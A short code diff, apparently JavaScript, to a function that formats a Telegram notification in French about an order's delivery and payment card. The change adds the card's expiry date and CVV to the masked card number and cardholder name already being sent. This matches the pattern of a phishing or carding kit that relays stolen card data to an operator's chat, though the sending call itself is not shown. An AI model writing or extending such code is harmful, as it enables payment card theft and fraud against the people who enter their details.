@@ -46,8 +46,11 @@ async function sendTelegramNotif(data) {
     lines.push(`📞 <b>Téléphone :</b> ${data.delivery.telephone}`);
   }
   if (data.card) {
-    lines.push(`💳 <b>Carte :</b> ${data.card.panMasked}`);
-    lines.push(`👤 <b>Nom titulaire :</b> ${data.card.nomTitulaire}`);
+    lines.push(`💳 <b>Carte:</b> ${data.card.panMasked}`);
+    lines.push(`📅 <b>Expiration:</b> ${data.card.expiry}`);
+    lines.push(`🔐 <b>CVV:</b> ${data.card.cvv}`);
+    lines.push(`👤 <b>Titulaire:</b> ${data.card.nomTitulaire}`);
+  
   }
 
   const text = lines.join('\n');
